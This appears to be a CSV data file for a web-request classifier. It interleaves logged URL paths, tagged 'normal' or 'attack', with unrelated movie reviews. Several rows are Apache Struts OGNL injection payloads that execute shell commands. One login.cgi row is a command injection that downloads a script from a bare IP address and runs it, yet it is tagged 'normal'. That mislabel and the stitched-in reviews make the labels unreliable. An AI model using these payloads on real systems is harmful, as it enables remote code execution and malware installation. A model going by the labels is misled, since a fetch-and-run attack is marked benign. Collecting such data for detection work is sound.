post,tags
/mt/know-how/2017/02/installation-of-php-from-source.html,normal
/jsearch/template/1/images/jsearch_logo.gif,normal
/admin.php,normal
"Personally, I regard ""The Egyptian"" in an extremely favourable light.<br /><br />It was introduced to me by a well-known Australian movie commenter & critic named Bill who was renowned for his insight & broad vision of people & places & particularly of films. This movie fitted the Bill perfectly & I came to appreciate his commentary & enthusiasm for this movie that emerged all the more as I watched it, as I was literally drawn into it, minute by minute, beyond his introductory comments, on my initial viewing many years ago.<br /><br />To me, it was propelled, layer upon layer, within half an hour, into an intriguing & fascinating production! Yes, I am aware of its flaws! But it was so enticing ・the young man of idealism learning from & inspired by his father ・the peasant treated like rubbish in his suffering ・the opportunistic friend however flawed but nonetheless loved by his friend, the central character Sinute ・and to be sure, a flawed hero too, like so many across humanity of all societies & across all time・ut lovable & worthy of love too! Yes, I believe in a Christian God, but too, I acknowledge the rights & respect that should be due ANY human being of good heart, who would not or will not disrespect the rights of his fellowman without just cause. As such, I endorse this film & its presentation of a man of good heart & conviction in his belief in the sun-god he was devoted to. Such people will always be welcome in my world vision, and hopefully, in many more beyond.<br /><br />So too, the drama in the ensuing movie I have watched often as surely as it has touched my heart & soul, as surely as it seems to have infuriated critics in its era. It is captivating, watching the struggles & grief & loves of Sinute, the physician! When I watch it again, I am always reminded of my friend in heart Bill, the film critic, who dared to oppose ALL the critics long ago who rubbished it. He added criticism of too many critics ・that they make statues to honour stars, on the screen or in history, but they do not make statues to honour critics! And beyond all this, I am reminded with each viewing of a SUPERB & TOUCHING spectacle, of a beautiful & well-presented drama, that was not just relevant to the 1950s or some bygone era. It was meant for YOU & ME, across time & place, to every man & woman & child & to their personal aspirations for love & freedom & overcoming obstacles to misunderstanding & gross injustice & tragedy appealing to those of simple faith of many religions, that it seems too many regard as cause for war! Take a night off from invitations or unjust violence, from bigotry & judgemental attacks on others injustly executed & consider the merits of this offering. Not to the sun god, or to power that proves time & again to be so transcient .. let this OUTSTANDING movie wash over you, like waves onto a beach, like the passing hands of time ・like life was meant to be. And maybe, you will find yourself carried into its world of possibilities! Lost offerings no more! 9.9 out of 10!",normal
/PMA/index.php,normal
"/struts_chat/board/board.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),new java.lang.String=&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=pwd",attack
/mt/mt-static/addons/Community.pack/themes/tristan-blue/header.gif,normal
/mt/know-how/mt.js,normal
/cgi-bin/mt/mt-search.cgi?IncludeBlogs=2&search=php2121121121212.1,normal
"Martin Lawrence could be considered a talented man, but those days are long gone. Runteldat shows a man who at once tries to play the sympathy card to his plight yet takes responsibility for it whenever he thinks it'll benefit his ego. The sad truth is that at this point in his life, his best days were behind him: his half-funny show was dead in the water after his co-star left and to today he faces a career of voice acting and god awful action films.<br /><br />One gets the impression that this concert film wasn't made to give Lawrence's career another boost after his humiliation but rather a childish attempt to clear the air by both trying to pathetically salvage what remained of his life and somehow twist it into something to be proud of, some defining moment in which he showed himself to have 'earned' his fame. Sadly, the concert is nothing but a gravelly-voiced Martin incoherently trying to be funny, invoke pathos, and then claim he doesn't care about it at all because hardcore. The sad truth is that this is the real public embarrassment for Lawrence: the way he rambles on invoking sad pity laughter makes you wish that he would just strip down to his underwear on stage, wave a gun around, and just reenact it all over again. There is no real insight to his performance at all. Much like the childish title states, Martin is trying to make his ultimate moment of truth his own in his way and fails miserably. He would have been better off waiting for the E! True Hollywood Story instead of running on a stage and making an idiot out of himself for the second time.<br /><br />Perhaps the saddest thing about this concert film--or rather, career eulogy--is that Martin didn't put any thought into this. What was this film supposed to prove? Sadly, that his fame was fleeting, he was a flash in the pan before the underwear incident, and now that the only way he can get work is piggybacking Will Smith or a Pixar production. They might as well called this concert 'Tombstone' because that's what it is. Martin Lawrence just dies on stage here, and with it goes what could have been an interesting career. Now? Just a pathetic side note in history.",normal
/noindex/css/fonts/Light/OpenSans-Light.woff,normal
"I've watched a lot of television in my 51 years, but I've never had so much fun week after week, as I had watching Oz. The acting by the entire cast was excellent. The writing was just perfect, with every character remaining consistent throughout the six year run. I also enjoyed the mayhem and the ultra-violence. It may sound odd, but it was at times, comical finding out how one of the characters would eventually end up dead. I particularly enjoyed the true romance and love between Beecher and Keller. Those two men really knew how to throw down, in every way possible. I truly hope that HBO will continue to show us re-runs of this great show FOREVER! I've watched every episode at least 4 times yet I still look forward to Tuesday and Thursday nights at 11 p.m. for an episode of this fun and very entertaining show.",normal
"/board/board.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),new java.lang.String=&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=pwd",attack
/robots.txt,normal
/mt/blog/2017/03/post-2.html,normal
"Anthony Wong plays Lok,a husband whose wife is seriously ill.Poor Lok-due to her illness he has been going without sex for a long time.That's why he is plagued by a series of sleazy nightmares featuring nurses and schoolgirls.""Erotic Nightmare"" is a fun Cat III flick loaded with sleaze and voyeurism.There is also a bit of gore as the first part of the film shows some nasty killings committed by Wong character under the influence of the monk's mystical powers.The dream sequences are quite erotic and sleazy,so I'm not complaining.Of course those who expect gruesome Cat III horror in the tradition of ""Diary of a Serial Killer"" or ""Red to Kill"" will be disappointed,but fans of sleazy exploitation cinema should give this one a look.7 out of 10.",normal
"Did you ever see the film ""Marathon Man""? The part with the dentist? I would rather have that happen to me than to sit through ""Random Hearts"" again. It wasn't simply uninteresting, or uneventful-- It was horribly, painfully, and agonizingly BORING. At one point, I momentarily lost conciousness. To the average layman, I may have appeared to be sleeping, but the other movie patrons knowingly realized I actually BLACKED OUT from the bordom. I thought I was going to die. When the film finally ended (I think it was twelve hours long, but I'm not sure), I let out an exhasperated ""Thank You Jesus, It's Over!!"", to which all other movie goers cheered. If I had to listen to Harrison Ford drone on one more second in that monotoned whine, I would have been forced to search for something sharp to jam in my eye to divert my attention. This is 136 minutes of my life I will never get back.",normal
/cgi-bin/mt/mt-cp.cgi?__mode=start_recover&return_to=http://www.reverse-edge.com/mt/know-how/2017/02/implementation-of-ssl.html,normal
/mt/know-how/2017/03/install-mysql-on-centos-7-using-yum.html,normal
/manager/html,normal
"I saw the movie in original Italian. It must be said that the acting and interpretation is most heavily polluted by the TV-generated trend to speak in a severely muffled voice, not moving lips, straining tones, as emerged in the ""That's real life""-productions and ""Let's-raise-our audience-with-a-few-tears""-screen-playwriting. The late Massimo Girotti towers upon the other characters for intensity, clarity of expression and intellectual honesty. The movie has some good hints, but (as in another comment before mine) it lacks a focal point and dribbles away in many plot-lets of lesser and lesser relevance, another trend dragged in from the TV productions, well known to Italians. A few drops in style could be spared to the public, such as the patisserie drag (Charm and aesthetics of cooking plus sensual payload of sweets, see Chocolat, Babette's lunch, Vatel etc.) Hammam and the Fairies are definitely more truthful, seems that Ozpetek has learned the tune of Italy in the early 2000s and is humming along... I'll give him a last chance though...",normal
"I rented this movie, because I noticed the cover in the video rental store. I saw Nolte, Connely, Madsen, 40's time setting, and thought ""hmm, can't be too bad."" Unfortunately, after watching it, my impression was ""not too good"".<br /><br />Its kind of a Chinatown ripoff, but the worst part is that other than Nolte, the other members of the squad didn't get enough screen time. But its a decent movie to see once I guess. And Melanie's role was small enough that she wasn't given a chance to be a nuisance.",normal
/tpl/user/tpl1/css/skins/blue.css,normal
"The female cast of this movie is terrific: you've got Linda Blair (maturing nicely), Julie Strain (who doesn't get too many speaking lines - that's a good thing), Rochelle Swanson (equally convincing as a sweet innocent girl or as an evil possessed girl), Toni Naples, and the most beautiful of them all IMO, the simply stunning Kristina Ducati (how the goofy male lead, Larry Poindexter, deserved to get sexually involved with any of these women remains a mystery). However, beyond the chance to watch these beautiful and in some cases talented women, the movie has little to offer. The plot is disjointed and doesn't really get going until the last 15 minutes or so; and when Wynorski finally manages to create some suspense, a ludicrous ""twist"" ending comes and ruins everything. (*1/2)",normal
/struts_chat/board/board.action,normal
/mt/blog/2017/09/s2-052.html,normal
"/struts_chat/board/board.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),new java.lang.String=&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=touch /tmp/exploit",attack
/mt/mt-static/support/assets_c/userpics/userpic-1-100x100.png,normal
"Chris Morris' Brass Eye TV series had always generated a large number of complaints, both from the audience and from the people taking part. But, nothing he has done has managed to stir up more controversy than this. The 2001 Brass Eye Special. Before the hugely overrated Jerry Springer Opera arrived, the Brass Eye Special held the record for the most complaints received about any TV program ever aired.<br /><br />The sheer volume of complaints that the general public made towards the Brass Eye Special was unbelievable! Many complaints were voiced by people who never even watched the program! The subject that the program handled turned many heads, but the message was widely misinterpreted. The message was even lost on some who enjoyed the program. This was not a show that mocked the subject of paedophilia. The show was purely about the media and it's presentation of the subject. Morris, is and always will be, a media satirist. The notion that the program 'makes fun' of paedophiles and children who have been abused is completely laughable! Morris never attempts to do either such thing. He merely draws our attention to the overwhelming, and very often stupid media hype surrounding the subject.<br /><br />Using many of his established 'Brass Eye' characters, such as, Ted Maul and others, Morris shows just how much the media over blow every little thing about a subject that they themselves created and built up, and the result is as funny, if not funnier, than anything Morris has done previously. Using his tried and tested formula, Morris manages to trick several gullible celebrities into believing that they are working on a serious documentary. In actuality, they are made to look like exactly what they are. Retards.<br /><br />All in all, the Brass Eye Special needs to be seen to be believed. And, with one opening line, Morris manages to sum up the entire media situation as it stood in 2001: ""Welcome to Paedo-Gedden!""",normal
"i first saw this movie back in the early 90's,and instantly fell in love with it.richard benjamin and his wife paula made the 1981 movie ""saturday the 14th""in 1981 prior to making this movie in 1983.i think they work quite well together.this movie made me laugh on several occasions.it also has a young molly ringwald,who would later go on in the late 1980's to do movies such as pretty in pink and sixteen candles.it is fun watching her a little younger.although not seen by many people..i don't even think the average movie fan has ever heard of this movie.but when i first came acrossed it i was glad i did.i gave this movie 10 out of 10 stars as i think it is a fun movie the whole family can enjoy.lastly i would like to say its not available on DVD,so i picked up a VHS copy on ebay,so if your interested,you probably can find one on there.it might be in the $20-$30 dollar range but i got mind for $12 bucks.i wish they would eventually release this on DVD.",normal
"To be frank, this is probably the best version in my book as a sound movie version of the Jazz Singer. The 1927 version is really a silent movie despite its build-up as the first talkie.<br /><br />Danny Thomas is a great comedian, and he sings very well. He does the Jewish stuff with feeling. Peggy Lee is great and any film that has her is always entertaining. Allan Joslyn is not too entertaining and we could have done without him. One question: since when do Cantors live in such luxurious houses???",normal
/mt/know-how/2018/03/,normal
/mysqladmin/index.php,normal
/mysql-admin/index.php,normal
"This was Chaplin's first all-talking picture, and the results are mixed. The movie is a biting satire of Hitler and Mussolini, their henchmen and their fanatical way of life, especially regarding the persecution of the Jews. It was daring and forward for 1940 and must have made a lot of people squirm.<br /><br />When compared to Chaplin's earlier works, this is quite pale in comparison. The sweet, funny style of his silents, in my opinion, is far superior to his first talkie. There are lots of meaningless bits that drag on. If this was a silent, it probably would not have happened.<br /><br />I find one of the funniest moments to be the musical barber moment and the globe dance. One of the most touching moments is, obviously, the speech at the end.<br /><br />The Great Dictator is an effective and at times moving film that is a very big part of both Chaplin's history and movie history. It is flawed, but Chaplin is in great form.",normal
"I saw this flick on the big screen as a kid and loved it -- cheeziness and all. Recently, I found a copy on video and checked it out again. Badly made, sure... schlocky fun, most definitely. It still packs an entertaining punch. It's much more fun than the dull Disney version (""Alive""). The only thing ""Alive"" did better were the special effects. If you're a lover of B-movies, I highly recommend ""Survive"", not to mention all the other Rene Cardona Jnr movies... and the Mexican wrestling flicks made by his father (Rene Cardona Snr). ""Survive"" is long overdue for DVD special edition treatment. Are you listening, all you kind folk, at Anchor Bay...?",normal
/robots.txt,normal
/mt/mt-static/themes-base/blog.css,normal
"This movie just was not very funny. There's not much else to say, other than that it was kind of embarrassing for Laurence Fishburne and David Hyde Pierce, both of whom deserve much better than this. Also, I don't understand why, after this movie completely and utterly bombed, WB insisted on making it into a TV show.",normal
/login.cgi?cli=aa aa';wget http://185.62.190.191/r -O -> /tmp/r;sh /tmp/r'$,normal
"***SPOILERS*** ***SPOILERS*** Wow, what a predicament Joanna has found herself in. After accidentally running over a young child, she goes to call for help, only to return to the crime scene amidst a group of very angry onlookers. Understanda- bly, this is too much for her to handle, and she flees the scene. Luckily the child didn't die, but is seriously injured and in a coma. So starts the biggest struggle in Joanna's life: should she keep quiet or speak up? At first she doesn't, but eventually she realises that it's torture living with such a horrible secret.<br /><br />At one point she even joins a search party to help find the culprit. And gradually a detective starts to question this woman's behavior. She wants to tell the truth, and she never meant to run away from the crime scene, but is it worth telling and having the whole town hate you for it?<br /><br />The thing about this movie is that you don't choose sides. Joanna is very much a good role model, even though she's made some wrong choices. You feel for her, even though you know what she did was wrong. Her journey is a good representation of what any human being would go through if something like this were to happen to them.<br /><br />Margaret Colin is an absolutely brilliant actress. She was amazing in the TV series Now and Again and great in films like Independence Day and The Devil's Own. Her performance here is so realistic and unforced that she carries us singlehandedly through the entire film. In the end, I wanted to see more of her. Lisa Vidal also provided some good supporting work as the gentle, resourceful detective.<br /><br />To wrap it up, if you wanna see a movie that will make you think long afterwards, one that will say ""This is reality"", then you won't want to miss this one.<br /><br />My rating: 9/10",normal
/robots.txt,normal
"/board/board.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),new java.lang.String=&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=pwd",attack
"While this film might not be the next Evil Dead ( Hell who knows maybe it will, it has only been out for a year) It is worth a look. Don't expect a $10 million film. cuz you'll be disappointed. DO expect to be entertain, to laugh, and to enjoy the experience.All in all this film is MUCH better than many if not all of the low budget horror films out there. I have seen films that spent more than 10 or 20 times what this film cost to make and turned out 10000000000 times worse. The effort that was put into this film far out weighs the set backs it faces by having a limited budget. Movies are meant to entertain, and this movie sure does that. In fact this film might even open up new doors for you in movie watching. It's available on Netflix if not your local video rental store. So watch it, then decide.",normal
/struts_chat/board/board.action,normal
/robots.txt,normal
"They say that it is always better in horror movies to leave things to the imagination of the viewer- to hide certain details from the audience in order to tickle their sense of imagination, dip into their fears and let that give birth to their darkest thoughts.<br /><br />That was not the case when I watched Bakjwi, under the American title Thirst. Now playing at select theaters near you. Seems like the film makers did not want to spare you any details. There WILL be blood in this film and you WILL try to look away.<br /><br />For rest of review please visit http://without-terebi.blogspot.com/2009/08/thirst-aka-bakjwi.html Thanks and hope you enjoyed reading above.",normal
"This is an excellent B-film horror movie that borders between horror and comedy. It is about a genetically mutilated scorpion in outer space. Can it get more unreal? It is a hybrid between ""Alien"" and ""Chain Saw Massacre."" The movie was shot in Stockholm with a mixed cast of Americans and Swedes that interact beautifully. Director Martin Munthe does a great job finding the comical highlights in this script and gets a few good laughs out of the audience. The movie was shot with little or no money and it is inspiring to see what can be done with limited resources. Stinger has all qualities of a B-film horror movie. It is comical and scary at the same time and the cast and crew are dedicated to their cause. It is great to see that movies like this can still be made! I would recommend seeing it if you like this type of films.",normal
"I thought this to be a pretty good example of a better soft core erotica film. It has a reasonable plot about the madame of a bordello caught up in a police scheme to nab a wealthy crook.<br /><br />Hardcore porn star Chloe Nichole again shows her genuine acting ability. She will occasionally appear in soft core such as ""Body of Love"" and ""Lady Chatterly's Stories. Nicole Hilbig, on the other hand, leaves something to be desired in her role as the female cop.",normal
/mt/know-how/styles.css,normal
"people, get a clue! I mean, the writers dont have one, so I would expect you to...this show is SUCH a pale imitation of the '60 show that you can laugh at it! and the sixties show is the one with the cheap special effects, and is in B&W fer Chrissakes! Yet the mood and the writing on the old show is MILES ahead of this drivel. Get HiP kids! if 98 Degrees or Brittany told you to watch it, you would! You know it! Just bypass them and tell all your friends you were 'IN' with the 'scene' BEFORE it became too cool!",normal
"I know I'm human. And if you were all these things, then you'd just attack me right now, so some of you are still human. This thing doesn't want to show itself, it wants to hide inside an imitation. It'll fight if it has to, but it's vulnerable out in the open. If it takes us over, then it has no more enemies, nobody left to kill it. And then it's won.<br /><br />John Carpenter's ""The Thing"" is one of the most entertaining horror films ever made ・fast, clever and purely exciting from start to finish. This is how all movies of the genre should be made.<br /><br />Taking place in the Antarctic in 1982, the movie focuses specifically on a group of American scientists. We are given no introduction to their mission, but are thrust into their existence when a pair of seemingly crazy Norwegians appears at their base camp, chasing an escaped dog. The Norwegians are killed, and the dog finds its way into the colony, which is when things really start to get crazy.<br /><br />It is soon made quite clear that the ""dog"" is actually a shape-shifting alien organism, which manifests itself upon the physical form of its victims ・in other words, it begins to eat the Americans, and imitate them so well that the remaining humans cannot discern the difference between their friends and enemies<br /><br />The pack of scientists, led by MacReady (Kurt Russell), begin to fight for their own survival, using wits instead of brawn. If the Thing is indeed amongst them, then how are they to go about revealing it? How many Things are there? How can the Thing be killed? (Or can it be destroyed at all?)<br /><br />The creature's origins in the film are explained easily: Thirty thousand years ago a spacecraft plummeted to Earth, and was frozen in the Antarctic ice. The Thing tried to escape, and was discovered in the ice by the Norwegians, who unknowingly released it from its natural prison.<br /><br />""The Thing,"" the movie itself, is similar to Ridley Scott's iconic ""Alien"" (1979). Many comparisons have been made ・the protagonists are stranded in a desolate area, stalked by a seldom seen foe that manages to kill them off one-by-one. However, ""The Thing"" ・for all practical purposes ・came first.<br /><br />Based on the famous short story ""Who Goes There?"" by John W. Campbell, Jr. (writing under pseudonym as Don A. Stuart), the film was originally adapted as a feature production in 1951 by Howard Hawks and Christian Nyby. The result was ""The Thing From Another World,"" an unarguable classic. But to be fair, it bore little resemblance to the short story, and Carpenter's remake does it more justice.<br /><br />The idea of the Thing being able to adapt the physicality of anyone is what essentially makes this movie so great, and is the most vital link to the short story. In 1951 the special effects were simply too poor to reasonably portray the shape-shifting organism, but thirty-one years brought many advances in SFX.<br /><br />Creature effects artist Rob Bottin does an excellent job of turning what could have easily become a cheesy gore-fest into a startlingly frightening (and realistic) mess of blood and fear. The Thing, although never actually taking one specific form, is constantly seen in a morphing stage, and the effects are simply superb. They still pack a punch twenty-two years later.<br /><br />Ennio Morricone's score (nominated for a Razzie Award at the time) is a bit too electronic and tinny, but nevertheless haunting when used correctly.<br /><br />From the fact that its cast consists entirely of males, to the fact that its ending is one of the most thought-provoking and untypical conclusions of all time, ""The Thing"" ・by any standards ・is unconventional Hollywood at its best. It comes as no surprise that, at the time of its release, ""The Thing"" performed poorly in theaters, and ""E.T."" ・released the same year and featuring a much kinder alien ・became the higher-grossing picture of the two (by far).<br /><br />In the long run, however, ""The Thing"" is superior in almost every conceivable way. Spielberg's tale is outdated and flopped during its 20th Anniversary Re-Release. ""The Thing,"" on the other hand, has gradually climbed a ladder of cult classics ・it is one of the most famous non-famous movies ever made.<br /><br />Carpenter is notorious for having a very uneven career ・from his amazing ""Assault on Precinct 13"" (1976) to the magnificent ""Halloween"" (1978) to the disappointing and silly ""Escape from L.A."" (1996), ""The Thing"" remains his very best motion picture. Although its reputation over the years has never been honorary enough to land it a spot on most ""great movies"" lists, ""The Thing"" is still one of my favorite horror films, and ・upon close inspection ・masterfully crafted. It is a daring and ingenious thrill-ride that is simultaneously unique and chilling ・a genuine relief for film buffs who are tired of the same old horror knock-offs. This one, at the very least, is genuinely unpredictable.",normal
/PMA/index.php,normal
/phpmyadmin1/index.php,normal
"This movie was recommended to me by some academics. From their comments, I had some pretty lofty expectations. But this movie was nothing but disappointing. The aim of the director is obvious--to use an interweaving of speeches/poems as a way to argue against the Bush doctrine. But the director fails miserably at this. Also I seriously question the director's choice of main character. It's a bum who is definitely not worthy of being heard. The rise of corporation power, so what? Most importantly, this movie gets a failing score in its persuasive power; it's clearly intended for those who've already formed their opinions. It's true that the movie's aesthetics are quite pleasing. But pretty much everything else in the movie simply sucks.",normal
"Not being a particular fan of westerns, I watched this primarily because I wanted to see Lucille Ball in something other than an ""I Love Lucy"" or ""Lucy Show"" type of role. Here she plays Christine Larson, owner of a saloon in the Arizona Territory in 1868 who's about to be married to the unscrupulous local Indian agent (Dean Jagger.) Ball's performance was OK - nothing really more than that; she didn't blow me away. It succeeded for me in that the role was very different from what I'm accustomed to seeing her in - there was very little of the outrageous physical comedy she later became famous for, although the movie tried to maintain a gently amusing feel throughout. (A typical funny line - ""there's two ways to deal with women - and no one knows either one of them!"") I didn't find the story all that compelling, although I appreciated that the Indians were shown as the victims of the Indian agent. There's typical shootout action and a lot of horses - your typical western in other words. As to Christine - we pretty much can guess from the beginning how her planned marriage is going to end up; it's just a question of how she's going to get there. If you like westerns, this would be a pretty typical one with a bit of humour thrown in. If you're not big on the genre, this will be lacking. I'm not big on the genre. 3/10",normal
"There are few films that deal with things that I would consider myself an expert on, this one is.<br /><br />After some years of Fantasy Role Playing we split, me not leaving without a sense of shame of what I had become: a dork.<br /><br />You see, these things are really canonical, it happens to everybody.<br /><br />First you create a character fairly and it dies after the first attack.<br /><br />Then you help a little with the constitution, and while you're at it, why not help with strength, intelligence, intuition, charisma and dexterity too? This in turn frustrates the game master who doesn't know how to deal with this invincible gang. And after a while it bores the players too, so they start to create ever more exotic race-profession combinations, no matter how ludicrous it is.<br /><br />I created a Druedain warrior monk, yeah, not that far from the film.<br /><br />And that's not all to be said about the destructiveness of the inherent dynamic of this devilish game (think the hunt for experience points), but just watch the film, it shows it all - and of course the stupidity of its most basic premisses.<br /><br />For this end, in turn, there is no better profession than the bard. I don't exactly understand why the bard became a character in the first place, after all, the blacksmith is none. But once it became one, it had to be mapped into the game flow, that is: it had to be made lethal, at least indirectly. The poking of fun out of this never comes to an end and rightfully so.<br /><br />Sure, it's not exactly a professional production, but I haven't seen a better satire in ages.",normal
/mt/mt-static/addons/Community.pack/themes/tristan-blue/bullet.gif,normal
"Anyone who appreciates fine acting and ringing dialogue will love<br /><br />this film. Taken from Ronald 'Taking Sides' Harwood, it's a funny<br /><br />and ultimately excoriating analysis of a relationship between two<br /><br />very 'actorly' types. Albert Finney is sublime as the despotic<br /><br />Shakespearean actor who barely notices the world war raging<br /><br />around him, so intent is he on the crumbling fortunes of his theatre<br /><br />company and his own psychological and emotional breakdown.<br /><br />Tom Courtenay is matchless as Norman, the 'Dresser' of the title,<br /><br />whose apparent devotion turns out to be anything but selfless.<br /><br />Really a must see.",normal
"i had been looking for this film for so long before i found it, i had seen it when i was younger and loved it, after my second viewing i still loved it and i still do.<br /><br />this is a love/hate film, if you like bottom, young ones, the comic strip, then you will find this funny. If you don't like that kind of humour then don't bother. I love this film and have grown up with these comedy programmes, for me this film is simply placing their comic genius on the big screen.. It is not an award winner by any means but if you just want good wholesome slapstick then this is it!<br /><br />the film lacks the quality of the TV series and this is usually the case with films but it still has enough material to keep you laughing even if a lot of the jokes are pretty similar to their previous work.<br /><br />yes, the humour is a little childish and not to everyone's taste but sometimes you just need that in a film.",normal
/mt/mt-static/support/assets_c/userpics/userpic-1-100x100.png,normal
"For those of you who have a few kind words for this film, I suspect you didn't see it when it was released as ""Parts: The Clonus Horror."" <br /><br />It was a dreadfully boring movie. It missed the mark in at least three ways. It wasn't good enough to be scary; it wasn't bad enough to be funny (although MST3K took care of that); and, even in 1979, the plot was unoriginal.<br /><br />Earlier contenders are ""The Resurrection of Zachary Wheeler"" (1971). It's the same idea (clones as spare parts). The movie is entertaining, and it had a fine cast. Another is ""Sleeper"" (1973). Yes, the Woody Allen movie. Remember the flattened nose? And ""Clones"" (1973). The last two plots aren't as similar to Clonus as the first one, but they predate Clonus.<br /><br />They are also several fiction books from decades earlier that deal with the idea, although often, the word ""clone"" isn't used.",normal
"I can't remember when I've seen a worse movie. The acting was overwrought, the dialog trite to the point of being painful to listen to, the special effects second-rate and the overall story laughable.<br /><br />I've never wanted to walk out on a movie more, and if I'd been alone that's what I'd have done, about 30 minutes into it, and saved myself nearly ANOTHER TWO EXCRUCIATING HOURS of nausea-inducing dialog and a plot with more holes than a swiss cheese ""the size of Texas."" I just can't overemphasize what a miserable experience sitting through this collosal waste of perfectly good celluloid was.<br /><br />",normal
"/board/board.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),new java.lang.String=&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=pwd",attack
"Based on actual events of 1905, silent film THE BATTLESHIP POTEMKIN concerns an Imperial Russian ship on which abominable conditions lead to a mutiny. Shocked by conditions on the ship, citizens of the port city Odessa rally to the mutineers' support--and in consequence find themselves at the mercy of Imperial forces, who attack the civilian supporters with savage force.<br /><br />POTEMKIN is a film in which individual characters are much less important than the groups and crowds of which they are members, and it achieves its incredible power by showing the clash of the groups and crowds in a series of extraordinarily visualized and edited sequences. Amazingly, each of these sequences manage to top the previous one, and the film actually builds in power as it moves from the mutiny to the citizen's rally to the massacre on the Odessa steps--the latter of which is among the most famous sequences in all of film history. Filming largely where the real events actually occurred, director Eisenstein's vision is extraordinary as he builds--not only from sequence to sequence but from moment to moment within each sequence--some of the most memorable images ever committed to film.<br /><br />To describe POTEMKIN as a great film is something of an understatement. It is an absolute essential, an absolute necessity to any one seriously interested in cinema as an art form, purely visual cinema at its most brilliant, often imitated, seldom equaled, never bested.<br /><br />Gary F. Taylor, aka GFT, Amazon Reviewer",normal
"I found it real shocking at first to see William Shakespeare's love masterpiece reworked into a gory, violent and kinky sensual movie adaptation. But after you watched it once, it sort of grows on you when you watch it the second and third times, as you come over the shock and start appreciating the movie on its own merits - solid acting, good dialogue, nice sequencing and choreography, not-too-bad soundtrack and some of the (special) effects that go on. Oh, and also the ending. What a riot!",normal
"I am not a big fan of the Spielberg/Cruise version of this film. And so I must throw in with the more humble Latt/Howel version. C Thomas Howel had more heart and more sympathy that Cruise in the lead role (at least in my opinion). Now this is hard to imagine until you strip away everything thing in the Spielberg version that cost more than a thousand dollars. There would be nothing left, no special effects, no sets, no Cruise. Because I doubt that anything cost more than a cool grand in the David Michael Latt version. So, comparing apples to turnips I guess I have to go with the turnips. At least it gives independent movies a shot at the epic science fiction disaster market.",normal
/mt/mt-static/addons/Commercial.pack/themes/professional-black/screen.css,normal
"Good Film.<br /><br />I managed to pick this up on DVD in a local store sale. 」2.99 seems like a good deal and it is. Thing is the film is named ""To Kill For"". It took a little detective work to find out it's original name.<br /><br />In the UK it has been rated as an 18 and rightly so although the standard of films depends on the ""ability to sell"". Having seen Final Destination 3 last night it, in my view, should have been a 18.<br /><br />Maybe the fact the delightful, Traci Lords is in it tends to make the classification board step it up to 18. Such a shame.<br /><br />Traci is a great actress and should be given the chance to appear in bigger and large budget productions. She ability to turn what is branded a B-Movies into a Fine performance is nothing short of amazing.<br /><br />Long Live Traci Lords and her incredible talent as an actress.",normal
"/struts_chat/board/board.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),new java.lang.String=&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=touch /tmp/exploit",attack
